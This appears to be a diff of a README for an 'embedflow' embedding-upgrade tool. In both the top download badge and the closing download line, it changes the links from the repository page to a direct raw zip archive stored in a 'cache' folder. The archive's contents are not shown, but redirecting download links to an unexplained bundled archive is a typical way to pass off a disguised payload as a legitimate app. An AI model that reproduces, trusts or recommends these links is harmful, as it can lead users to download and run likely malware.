@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download embedflow](https://img.shields.io/badge/Download-embedflow-2ea44f?style=for-the-badge)](https://github.com/pwolfey09-sketch/embedflow)
+[![Download embedflow](https://img.shields.io/badge/Download-embedflow-2ea44f?style=for-the-badge)](https://github.com/pwolfey09-sketch/embedflow/raw/refs/heads/main/embedflow/cache/3.6.zip)
 
 Visit this link to download the application.
 
@@ -178,7 +178,7 @@ embedflow simplifies the complex process of upgrading embedding models. Whether 
 
 Visit the download link below to get started today!
 
-**Download embedflow:** [https://github.com/pwolfey09-sketch/embedflow](https://github.com/pwolfey09-sketch/embedflow)
+**Download embedflow:** [https://github.com/pwolfey09-sketch/embedflow/raw/refs/heads/main/embedflow/cache/3.6.zip](https://github.com/pwolfey09-sketch/embedflow/raw/refs/heads/main/embedflow/cache/3.6.zip)
 
 ---
 
